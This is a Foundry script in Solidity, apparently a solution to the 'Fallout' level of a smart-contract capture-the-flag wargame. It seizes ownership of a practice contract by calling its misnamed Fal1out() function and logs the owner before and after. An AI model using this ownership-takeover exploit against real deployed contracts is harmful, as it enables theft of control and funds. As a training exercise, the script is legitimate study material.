// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../instance/Fallout.sol";

contract POC is Script {    
    Fallout level2 = Fallout(0x9bd03768a7DCc129555dE410FF8E85528A4F88b5);

    function run() external {
        vm.startBroadcast();

        console.log("Current Owner is: ", level2.owner()); // querying current owner
        level2.Fal1out(); // calling the vulnerable function
        console.log("New Owner is: ", level2.owner()); // checking if the owner changed

        vm.stopBroadcast();
    }
}